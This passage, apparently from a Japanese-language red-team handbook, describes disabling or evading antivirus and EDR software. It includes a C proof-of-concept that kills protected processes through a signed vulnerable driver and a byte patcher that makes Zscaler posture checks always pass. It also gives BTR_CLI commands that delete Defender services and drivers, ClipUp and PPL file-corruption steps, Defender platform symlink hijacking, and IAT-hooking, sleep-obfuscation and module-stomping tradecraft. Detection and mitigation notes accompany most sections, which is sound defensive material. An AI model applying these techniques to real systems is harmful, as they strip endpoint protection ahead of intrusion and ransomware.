https://github.com/praetorian-code/vulcan
```

### さらに

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するため、**Antivirus Terminator** として知られる小型のコンソールユーティリティを利用しました。このツールは**脆弱だが *署名済み* のドライバーを自ら持ち込み**、それを悪用して、Protected-Process-Light（PPL）AV サービスでさえブロックできない特権付きの Kernel 操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済みドライバー**: ディスクに書き込まれるファイルは `ServiceMouse.sys` ですが、バイナリは Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる正規署名済みドライバー `AToolsKrnl64.sys` です。ドライバーには有効な Microsoft 署名が付いているため、Driver-Signature-Enforcement（DSE）が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   1行目はドライバーを**カーネルサービス**として登録し、2行目はそれを起動します。これにより、`\\.\ServiceMouse` がユーザーランドからアクセス可能になります。
3. **ドライバーが公開するIOCTL**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PIDを指定して任意のプロセスを終了する（Defender/EDRサービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードし、サービスを削除する |

   最小限のC proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD は user-mode の保護を完全に回避します。kernel で実行されるコードは、PPL/PP、ELAM、その他のハードニング機能に関係なく、*保護された*プロセスを開いたり、終了させたり、kernel オブジェクトを改ざんしたりできます。

検知 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *kernel* サービスの作成を監視し、world-writable なディレクトリからドライバーが読み込まれた場合、または許可リストにない場合にアラートを出します。
•  カスタムデバイスオブジェクトへの user-mode ハンドルと、それに続く不審な `DeviceIoControl` 呼び出しを監視します。

### ディスク上のバイナリをパッチして Zscaler Client Connector の Posture Checks を回避する

Zscaler の **Client Connector** は、デバイスの posture ルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC に依存しています。設計上の弱点が 2 つあるため、完全な回避が可能です。

1. Posture の評価は **完全にクライアント側** で行われます（boolean がサーバーに送信されます）。
2. 内部 RPC エンドポイントは、接続元の実行ファイルが Zscaler によって署名されていることだけを検証します（`WinVerifyTrust` による検証）。<sup>[[11]](#references)</sup>

**ディスク上の署名済みバイナリ 4 つにパッチを適用** することで、両方の仕組みを無効化できます。

| バイナリ | パッチ対象の元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが準拠状態になる |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP 化 ⇒ 署名のないプロセスを含め、どのプロセスでも RPC パイプにバインドできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | トンネルの整合性チェック | ショートサーキット |

最小限のパッチャーの抜粋:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動すると:

* **すべての**セキュリティ態勢チェックが**緑色／準拠**と表示されます。
* 署名のないバイナリや改変されたバイナリが、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開けるようになります。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークに無制限にアクセスできるようになります。

このケーススタディは、クライアント側だけで行われる信頼判断と単純な署名チェックが、数バイトのパッチで回避されることを示しています。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** ドライバーは、従来の BYOVD に対する有用な反例です。`BTR.sys` はメモリ破損バグも IOCTL インターフェースもない、Microsoft の正規署名付き修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、オペレーターは代わりに、ドライバーの非公開の修復トランザクションを偽造し、本来想定された Ring-0 のファイル／レジストリ操作を実行できます。これは**侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製ドライバーを持ち込まずに、標的自身の `MpEngine.dll` にある `BOOTTIMETOOL` リソースからドライバーを抽出できます。<sup>[[36]](#references)</sup>

### ワンショットドライバーのステージング

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとしてドロップし、同様の名前のカーネルサービスを登録します。`DriverEntry` はサービスの `Args` 値を読み取り、参照されている NTFS ADS を開いて、アクションリストを復号・検証し、フィードバックを書き込みます。実行が成功すると `0xC0000056` (`STATUS_DELETE_PENDING`) を返し、ドライバーが常駐せずにアンロードされるようにします。偽造したサービスには、次のような特徴的な値があります。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれています。解析対象のビルドでは固定の256バイトキーが再利用されているため、暗号化は認可境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されたトランザクションID）に続き、null終端UTF-16のfeedbackパスと、任意の数のアイテムで構成されます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、末尾は**正確に4バイトのNUL**で終わります。各ヘッダー／データ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**final XORなし**（`~CRC32`）で個別に検証されます。領域ごとにCRC状態はリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け入れられるアクションIDから、以下のカーネルプリミティブを利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含むファイルの削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリの削除 |
| 3 | `[Flags][source][destination]` | 攻撃者が指定した保護パスへのファイル移動。destinationが空の場合は削除 |
| 4 | `[Flags][key path]` | レジストリキーの再帰的な削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値の削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値の作成／更新と、不足しているキー階層の作成 |

アクション5と6では、ワイヤ上のキー／値セパレーターは**連続する2つのバックスラッシュ**です。一般的な形式のパスでは正しく分割されません。feedbackファイルはリクエストをほぼそのまま反映しますが、各アイテムのデータの先頭4バイトは、結果の`NTSTATUS`になります。先頭にflagsフィールドがないアクション1と2では、BTRはそのステータス用の領域を確保するため、パスを予約済みの末尾4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI` のワークフローと起動初期のウィンドウ

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は、一連の処理全体を実装します。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とfeedbackストリームを作成し、連鎖したアクションをシリアライズ、チェックサム計算、暗号化した後、サービスレジストリキーを直接作成します。その後、`-trigger now`では`NtLoadDriver`を呼び出し、`-trigger boot`ではsystem-startドライバーとして残します。レジストリを直接ステージングすることで、通常のSCM `CreateServiceW`経路を回避するため、サービスインストールのEvent ID 7045は**記録されません**。起動トリガーで作成されたアーティファクトは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` は使用できません。BTR はストレージスタックと `SystemRoot` リンクの準備が整う前に、`DriverEntry` からファイル I/O を実行するためです。`Start=1` と高優先度の `Boot Bus Extender` グループを組み合わせると、Phase 1 で実行されます。この時点では NTFS は使用できますが、多くのシステム起動セキュリティドライバーやユーザーモード EDR サービスはまだ初期化されていません。`WdFilter` などのブート開始フィルターはすでに読み込まれている場合がありますが、BTR は次回の起動前にそのバイナリやサービス構成を削除でき、SCM がサービス実行ファイルを起動する前に削除することもできます。BTR はブート開始評価の後に実行され、有効な Microsoft 署名を持つため、ELAM でもこの隙間は塞げません。<sup>[[36]](#references)</sup>

複数のアクションを1つのトランザクションで実行できます。PoC は、ハードコードされた `\SystemRoot\Temp\BootClean.log` に対する Action 1 を先頭に追加します。BTR はこのログを作成し、自身の削除要求を処理して、アンロード前にログを削除します。これにより痕跡を減らせます。また、フィードバックを `<random>.sys:<random>.dat` に保存すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 検知精度の高い相関関係

署名だけに基づくルールや Microsoft の脆弱なドライバーのブロックリストでは、BTR の本来の機能の悪用に対処できません。正規の Defender 系統と、任意のランチャーを区別しながら、次の振る舞いを相関させて検知してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` の作成は、BTR のステージングで必ず発生します。同じ `.sys` に `.dat` の ADS が付いている場合は、特に疑わしい兆候です。正規の Defender は通常、フィードバックを `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 以下に保存します。
- **System 7045 を伴わない Sysmon 12/13:** `Args=...:changelist` と `Group=Boot Bus Extender` を含む `HKLM\SYSTEM\CurrentControlSet\Services\<random>` の直接作成を、対応する SCM のインストールイベントがない場合に相関させます。
- **Sysmon 6 -> 23:** 既知の BTR ドライバーが Defender 以外の系統から読み込まれた後、特にセキュリティ関連バイナリが `System`/PID 4 によって削除された場合に相関させます。
- **Sysmon 11 -> 23:** `System`/PID 4 による `\SystemRoot\Temp\BootClean.log` の短時間での作成と削除をアラートします。
- `SeLoadDriverPrivilege` の割り当てと有効化を制限・監査してください。`cmd.exe`、PowerShell、または不明なプロセスによってセキュリティツールのドライバーがステージングされる場合、Microsoft の署名だけでは信頼する根拠として不十分です。

## LOLBINs を使って Protected Process Light (PPL) を悪用し、AV/EDR を改ざんする

Protected Process Light (PPL) は署名者と保護レベルの階層を適用し、同等以上の保護レベルを持つプロセスだけが相互に改ざんできるようにします。攻撃者の視点では、PPL 対応バイナリを正規の方法で起動し、その引数を制御できれば、ロギングなどの無害な機能を、AV/EDR が使用する保護ディレクトリへの書き込みに制限された、PPL によって保護されたプリミティブに変えることができます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL としてプロセスを実行する条件
- 対象 EXE（および読み込まれる DLL）は、PPL 対応の EKU で署名されている必要があります。
- プロセスは、`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` フラグを指定して CreateProcess で作成する必要があります。
- バイナリの署名者に適合する保護レベルを要求する必要があります（例: マルウェア対策署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。誤ったレベルを指定すると、作成に失敗します。

PP/PPL と LSASS の保護については、こちらの概要も参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher ツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象 EXE に渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身を子プロセスとして起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け付けます。
- PPL プロセスとして起動すると、PPL の権限でファイル書き込みが行われます。
- ClipUp はスペースを含むパスを解析できないため、通常は保護されている場所を指定する際に 8.3 短縮パスを使用します。

8.3 短縮パスのヘルパー
- 短縮名を一覧表示: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` で PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を渡し、保護された AV ディレクトリ（例: Defender Platform）内にファイルを作成させます。必要に応じて 8.3 短縮名を使用します。
3) 対象バイナリが実行中の AV によって通常は開かれている、またはロックされている場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、確実に早く実行される自動起動サービスをインストールして、ブート時に書き込みをスケジュールします。Process Monitor のブートログで起動順序を検証します。
4) 再起動すると、AV がバイナリをロックする前に PPL の権限で書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のため、パスは省略／短縮しています）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事項と制約
- ClipUp が書き込む内容は配置場所以外制御できません。このプリミティブは、正確なコンテンツの注入ではなく破損に適しています。
- サービスのインストール／起動にはローカル管理者権限または SYSTEM 権限が必要で、再起動できる時間帯も必要です。
- タイミングが重要です。対象が開かれていない必要があります。起動時に実行することでファイルロックを回避できます。

検知
- 起動前後に、特に標準外のランチャーを親プロセスとして、通常とは異なる引数で実行される `ClipUp.exe` のプロセス作成。
- 不審なバイナリを自動起動するよう設定された新しいサービス、および Defender/AV より常に先に起動するサービス。Defender の起動失敗前にサービスが作成／変更されていないか調査します。
- Defender バイナリ／Platform ディレクトリのファイル整合性監視。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更。
- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` で作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を調べます。

緩和策
- WDAC/Code Integrity: PPL として実行できる署名済みバイナリ、およびその親プロセスを制限し、正規の状況以外での ClipUp の実行をブロックします。
- サービスの管理: 自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効であることを確認します。バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを配置するボリュームで 8.3 短縮ファイル名の生成を無効にすることを検討します（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行元の platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も大きい辞書順のバージョン文字列（例: `4.18.25070.5-0`）を持つサブフォルダーを選び、その場所から Defender サービスのプロセスを起動します（それに応じてサービス／レジストリのパスも更新されます）。この選択では、ディレクトリの再解析ポイント（シンボリックリンクを含む）もディレクトリエントリとして信頼されます。管理者はこれを利用して Defender の参照先を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者権限（Platform フォルダー内にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender の platform 再選択（起動時のサービス再起動）を実行できること
- 必要なのは組み込みツールのみ（mklink）

仕組み
- Defender は自身のフォルダーへの書き込みをブロックしますが、platform の選択時にはディレクトリエントリを信頼し、リンク先が保護された／信頼できるパスであるか検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在の platform フォルダーの書き込み可能なコピーを `C:\TMP\AV` などに用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダを指す上位バージョンのディレクトリシンボリックリンクを作成します。
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）：
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します。
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` 配下の新しいプロセスパスと、その場所を反映したサービス設定／レジストリを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置／置換し、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- サービスの停止／拒否: バージョンシンボリックリンクを削除すると、次回起動時に設定されたパスが解決できず、Defender の起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この technique 単独では privilege escalation はできない点に注意してください。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、対象モジュールの Import Address Table (IAT) を hook し、選択した API を攻撃者が制御する position-independent code (PIC) に経由させることで、runtime evasion を C2 implant から対象モジュール自体へ移せます。これにより、多くの kit が公開する限られた API（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOFs や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

概要
- reflective loader（先頭に追加、または companion として配置）を使い、対象モジュールと一緒に PIC blob を配置します。PIC は自己完結型かつ position-independent である必要があります。
- host DLL のロード時に IMAGE_IMPORT_DESCRIPTOR をたどり、対象の import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entry を薄い PIC wrapper に向けて patch します。
- 各 PIC wrapper は、実際の API address に tail-call する前に evasion を実行します。一般的な evasion には次のものがあります。
  - 呼び出し前後に memory mask/unmask を行う（例: beacon 領域を encrypt、RWX→RX、page 名や permissions を変更し、呼び出し後に復元）。
  - Call-stack spoofing: 無害な stack を構築し、target API に移行することで、call-stack analysis が想定される frame に解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOFs、post-ex DLL で hook する API を登録できる interface を export します。

ここで IAT hooking を使う理由
- hook した import を使うあらゆる code で機能し、tool code の変更や、特定の API を proxy する Beacon に依存する必要がありません。
- post-ex DLL に対応します。LoadLibrary* を hook すると、module のロード（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API 呼び出しにも同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapper することで、call-stack ベースの detection に対して、process-spawning post-ex command を安定して使用できます。

最小限の IAT hook の概要（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
メモ
- relocations/ASLR後、importが初めて使用される前にパッチを適用します。TitanLdr/AceLdrのようなReflective loaderは、ロードされたモジュールのDllMain内でhookする方法を示しています。
- wrapperは小さく、PIC-safeに保ちます。パッチ適用前に取得した元のIAT値、またはLdrGetProcedureAddressを使って、本来のAPIを解決します。
- PICにはRW → RXの遷移を使用し、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr形式のPIC stubは、良性のモジュール内にreturn addressを置いた偽のcall chainを構築し、その後、本物のAPIに移行します。
- これにより、Beacon/BOFsから機密性の高いAPIを呼び出す際に、正規のstackを期待する検出を回避できます。
- stack cutting/stack stitching技術と組み合わせ、API prologueの前に想定されるframe内へ移行します。

運用への統合
- reflective loaderをpost-ex DLLの先頭に追加し、DLLのロード時にPICとhookが自動的に初期化されるようにします。
- Aggressor scriptで対象APIを登録すると、BeaconやBOFsはコードを変更せずに、同じ回避経路を透過的に利用できます。

検出/DFIRでの考慮事項
- IATの整合性: 非イメージ領域（heap/anon）を指すentryや、import pointerの定期的な検証。
- stackの異常: ロード済みイメージに属さないreturn address、非イメージPICへの急な遷移、RtlUserThreadStartの祖先関係の不整合。
- loaderのテレメトリ: プロセス内でのIATへの書き込み、import thunkを変更する早期のDllMain処理、ロード時に予期せず作成されるRX領域。
- イメージロードの回避: LoadLibrary*をhookする場合、メモリマスキングイベントと相関する、automation/clr assemblyの不審なロードを監視します。

関連する構成要素と例
- ロード中にIAT patchingを行うreflective loader（例: TitanLdr、AceLdr）
- メモリマスキングhook（例: simplehook）とstack-cutting PIC（stackcutting）
- PICのcall-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐PICOによるimport-time IAT hook

reflective loaderを制御できる場合、カスタムresolverでloaderの`GetProcAddress` pointerを置き換え、まずhookを確認することで、`ProcessImports()`の**実行中**にimportをhookできます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 一時的なloader PICが自身を解放した後も残る**resident PICO**（persistent PIC object）を作成します。
- `setup_hooks()`関数をexportし、loaderのimport resolverを上書きします（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress`ではordinal importをスキップし、`__resolve_hook(ror13hash(name))`のようなhashベースのhook検索を使います。hookがあればそれを返し、なければ本物の`GetProcAddress`に処理を委譲します。
- Crystal Palaceの`addhook "MODULE$Func" "hook"`エントリで、link時にhook対象を登録します。hookはresident PICO内に存在するため、有効な状態を保ちます。

これにより、ロード後にDLLのcode sectionへパッチを適用せずに、**import-time IAT redirection**を実現できます。

### 対象がPEB-walkingを使う場合にhook可能なimportを強制する

import-time hookが動作するのは、対象のIATにその関数が実際に存在する場合だけです。モジュールがPEB-walk + hashでAPIを解決し（import entryがない場合）、loaderの`ProcessImports()`経路に認識させるには、実際のimportを強制します。

- hash化されたexportの解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject`のような直接参照に置き換えます。
- compilerはIAT entryを生成するため、reflective loaderがimportを解決する際にinterceptできるようになります。

### `Sleep()`にパッチを適用しないEkko形式のsleep/idle obfuscation

`Sleep`にパッチを適用する代わりに、implantが使用する**実際のwait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）をhookします。長時間のwaitでは、Ekko形式のobfuscation chainで呼び出しを囲み、idle中にメモリ内のイメージを暗号化します:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`で、加工した`CONTEXT` frameを使って`NtContinue`を呼び出すcallbackのシーケンスをスケジュールします。
- 典型的なchain（x64）: イメージを`PAGE_READWRITE`に設定 → マップ済みイメージ全体を対象に`advapi32!SystemFunction032`でRC4暗号化 → blocking waitを実行 → RC4復号 → PE sectionを走査して**sectionごとのpermissionを復元** → 完了を通知。
- `RtlCaptureContext`でtemplateとなる`CONTEXT`を取得し、複数のframeに複製して、各処理を呼び出すようregister（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: 長時間のwaitでは（例: `WAIT_OBJECT_0`）、imageをマスキングしている間にcallerが処理を続けるよう、“success”を返します。このパターンは、idle中にscannerからモジュールを隠し、従来の「patched `Sleep()`」のsignatureを避けます。

検出のアイデア（telemetryベース）
- `NtContinue`を指す`CreateTimerQueueTimer` callbackの集中。
- 大きな連続したイメージサイズのbufferに対する`advapi32!SystemFunction032`の使用。
- 大きな範囲への`VirtualProtect`の後に、sectionごとのpermissionを独自に復元する処理。

### sleep-obfuscation gadgetのruntime CFG登録

CFGが有効な対象では、`jmp [rbx]`や`jmp rdi`のような関数途中のgadgetへの最初の間接jumpは、通常、gadgetがモジュールのCFG metadataに存在しないため、`STATUS_STACK_BUFFER_OVERRUN`でプロセスがcrashします。強化されたプロセス内でEkko/Kraken形式のchainを動作させるには:<sup>[[30]](#references)</sup>

- chainが使用するすべての間接遷移先を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)`と`CFG_CALL_TARGET_VALID` entryで登録します。
- ロード済みイメージ内（`ntdll`、`kernel32`、`advapi32`）のaddressでは、`MEMORY_RANGE_ENTRY`の開始位置を**イメージのbase**とし、**イメージ全体のサイズ**を対象にする必要があります。
- 手動map/PIC/stompされた領域では、代わりに**allocation base**とallocation sizeを使用します。
- dispatch gadgetだけでなく、間接的に呼び出されるexport（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、間接遷移先となる攻撃者制御下の実行可能sectionも登録します。

これにより、ROP/JOP形式のsleep chainは「CFGが無効なプロセスでしか動作しない」状態から、`explorer.exe`、browser、`svchost.exe`など、`/guard:cf`を有効にしてcompileされた各種endpointで再利用できるprimitiveになります。

### sleep中のthreadに対するCET-safeなstack spoofing

`CONTEXT`を完全に置き換える方法は目立ちやすく、CET Shadow Stack環境では、spoofした`Rip`がhardware shadow stackと一致する必要があるため、問題を起こす場合があります。より安全なsleep-maskingパターンは次のとおりです:<sup>[[30]](#references)</sup>

- 同一プロセス内の別threadを選び、`NtQueryInformationThread`を使って`NT_TIB` / TEBのstack bounds（`StackBase`、`StackLimit`）を読み取ります。
- 現在のthreadの本来のTEB/TIBをバックアップします。
- `GetThreadContext`で実際のsleep中のcontextを取得します。
- spoof contextでは、本物の`Rip`**だけ**をコピーし、spoofした`Rsp`/stack stateはそのままにします。
- sleep中、spoof対象threadの`NT_TIB`を現在のTEBにコピーし、stack walkerが正当なstack範囲内でunwindするようにします。
- waitの完了後、元のTIBとthread contextを復元します。

これにより、CETと整合するinstruction pointerを維持しつつ、TEBのstack metadataを信頼してunwindを検証するEDR stack walkerを誤認させます。

### 代替手段: APCベースのKraken Mask

timer-queue dispatchのsignatureが強すぎる場合、同じsleep-encrypt-spoof-restore sequenceを、APCをキューイングしたsuspended helper threadから実行できます:<sup>[[27]](#references)</sup>

- entrypointを`NtTestAlert`にしたhelper threadを作成します。
- 準備した`CONTEXT` frame/APCを`NtQueueApcThread`でキューイングし、`NtAlertResumeThread`で実行します。
- defaultの64 KB thread stackを使い切らないよう、chain stateはhelper stackではなくheapに保存します。
- `NtSignalAndWaitForSingleObject`でstart eventの通知とblockを原子的に行います。
- TIB/contextを復元する前にmain threadをsuspendし（`NtSuspendThread` → restore → `NtResumeThread`）、scannerが復元途中のstackを捉えるrace windowを小さくします。

これにより、RC4によるマスキングとstack-spoofingの目的を維持したまま、`CreateTimerQueueTimer` + `NtContinue`のsignatureをhelper-thread/APCのsignatureに置き換えます。

追加の検出アイデア
- sleep、wait、APC dispatchの直前に行われる、`VmCfgCallTargetInformation`を指定した`NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe`を囲む`GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread`の後に行われる、現在のthreadのTEB/TIB stack boundsへの直接書き込み。
- `SystemFunction032`、`VirtualProtect`、section-permission復元helperに間接的に到達する`NtQueueApcThread`/`NtAlertResumeThread`のchain。
- 署名済みモジュール内のdispatch pivotとして、短いgadget signature（`FF 23`（`jmp [rbx]`）や`FF E7`（`jmp rdi`）など）を繰り返し使用すること。


## 精密なModule Stomping

Module stompingは、明らかに検出されやすいprivate executable memoryを割り当てたり、新しい使い捨てDLLをロードしたりする代わりに、対象プロセス内にすでにmapされているDLLの**`.text` sectionから**payloadを実行します。上書き先には、プロセスが引き続き必要とするcode pathを破壊せずにpayloadを格納できる、**ロード済みのdisk-backed image**を選びます。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高い対象選択

`uxtheme.dll`や`comctl32.dll`のような一般的なモジュールを無計画にstompする方法は脆弱です。対象DLLがremote processにロードされていない場合があり、code領域が小さすぎるとプロセスがcrashします。より信頼性の高い手順は次のとおりです。

1. 対象プロセスのmoduleを列挙し、すでにロードされているDLLだけを含む**名前のみのinclude list**を作成します。
2. 先にpayloadを作成し、その**正確なbyte size**を記録します。
3. ディスク上の候補DLLを調べ、PE sectionの**`.text`の`Misc_VirtualSize`**とpayload sizeを比較します。これは、メモリにmapされた際の実行可能sectionのサイズを反映するため、ファイルサイズより重要です。
4. **Export Address Table (EAT)**を解析し、stomp開始offsetとしてexport functionのRVAを選びます。
5. **blast radius**を計算します。payloadが選択したfunctionの境界を超えると、メモリ上で後続に配置された隣接exportを上書きします。

